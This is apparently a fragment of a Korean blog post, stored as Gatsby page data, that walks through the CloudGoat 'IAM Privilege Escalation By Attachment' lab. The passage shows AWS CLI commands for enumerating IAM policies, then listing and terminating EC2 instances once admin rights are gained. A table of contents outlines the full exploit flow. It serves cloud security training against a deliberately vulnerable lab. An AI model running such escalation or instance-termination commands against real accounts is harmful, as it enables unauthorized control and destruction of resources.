url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXElEQVQ4y31T2VLbQBBcg40PHT51WPKl+wLbspBdAkICpCp5yv//TadmhF0GnDxM9e5ObW9Pz6z4sylQ7h8Rp/fI7vYodg/wq19IDm/Y75+xyR9wqF6x3lZYLBOsnAyev0YY5XCcDOY8gDdwUXUSHOQU4r58QXZXIS++Y5N/gxfuUORPqKqfKPavKA9veHj6zbjdPXPsyh8oyhcMRksI0YNoKBBXUh3J7QH2PEEY38PxNli5a5h2hCAq4AVbWLMYbrDlnOvXOJqs0B/O0ZVMXDWHuG4O0WyOOIRphYiSErrpQ1Kt02U/zJlgtkghqzZfFIKU9CEaKkfjesDnhMe1mC8zJqRXqYRaWX7CJDvAD3eca7XHtaLWkPFIdlwz4UR3WZ1m+JgYHnqyiU7PgNK3MbUjPqfSSCXFUeVnZSdC8i5O96DSSS1dIjJ1MMPKW3POsEKuQDM8Rlm1TqSfQ5DpVB75ZS9SqIM5SDVdNKYBqycc6y5a7QmrJ/ys7ERI3SJSMp+6XWPKimk/tWPOU9lEQsouNeNESMpoVHQzYIL56hajiVN3UkgQQq6D9tThM/8uKmx3dX693dXQlQnrPZV205ngpqPhpquh09P5rN3TPyj8Qkj+xWkJL8wRpSV7SWdBtEMQF7jbPGLh3LIVlDsv/6LC2TJjv8j8sebwBdqbVsQkZAV1nJQRUU+e/p+QhpZepiE+dpZwrLkcSn/GQ13Pa8CzSXjdGl0u+aiO/7AVskJaEwn5KSlW7d27t5Iy5Vn9J6E6nkIZm5CGBpSRCXnw/m/PuvohGv0v//ic8C+FZpOvQkSe2AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"17\"\n        title=\"17\"\n        src=\"/static/76a4fa87e881ac50c20140b663badf06/37523/17.png\"\n        srcset=\"/static/76a4fa87e881ac50c20140b663badf06/e9ff0/17.png 180w,\n/static/76a4fa87e881ac50c20140b663badf06/f21e7/17.png 360w,\n/static/76a4fa87e881ac50c20140b663badf06/37523/17.png 720w,\n/static/76a4fa87e881ac50c20140b663badf06/65654/17.png 872w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>성공 적으로 연결이 완료되었다면 <code class=\"language-text\">cg-ec2-mighty-role-/cloud goat id/</code> 연결된 IAM Rule 및 정책을 열거하겠습니다.</li>\n<li>SSH 연결한 EC2 인스턴스에 AWS CLI를 설치 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-policies --query <span class=\"token string\">\"Policies[?starts_with(PolicyName, 'cg')]\"</span>\n\n aws iam get-policy-version \\\n --policy-arn <span class=\"token string\">\"arn:aws:iam::ACCOUNT-ID:policy/cg-ec2-mighty-policy\"</span>  \\\n --version-id <span class=\"token string\">\"v1\"</span></code></pre></div>\n<ul>\n<li>해당 서버에서 EC2 인스턴스 관리자 권한을 획득한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances --region us-east<span class=\"token number\">-1</span>\n aws ec2 terminate-instances --instance-ids &lt;instanceId> --region us-east<span class=\"token number\">-1</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#kerrigan-iam-profile\">Kerrigan IAM Profile</a></li>\n<li><a href=\"#%EA%B6%8C%ED%95%9C-%EC%97%AD%ED%99%9C%EC%9D%84-%ED%8C%8C%EC%95%85%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95\">권한 역활을 파악하는 방법</a></li>\n<li><a href=\"#ec2-key-pair-%EC%83%9D%EC%84%B1\">EC2 Key pair 생성</a></li>\n<li><a href=\"#%EC%B5%9C%EA%B3%A0-%EA%B4%80%EB%A6%AC%EC%9E%90-iam-instance-%ED%94%84%EB%A1%9C%ED%95%84%EC%9D%84-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2-instance%EB%A1%9C-%EB%B3%80%EA%B2%BD\">최고 관리자 IAM Instance 프로필을 새로운 EC2 Instance로 변경</a></li>\n<li><a href=\"#ssh%EB%A5%BC-%ED%86%B5%ED%95%B4-%EC%83%88%EB%A1%9C%EC%9A%B4-ec2%EC%97%90-%EC%95%A1%EC%84%B8%EC%8A%A4\">SSH를 통해 새로운 EC2에 액세스</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 5 (CloudGoat: IAM Privilege Escalation By Attachment)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-5/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/we_application_SSRF/","nextSlug":"/web_application_rce1/","prevSlug":"/cloud-service-vuln-5/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}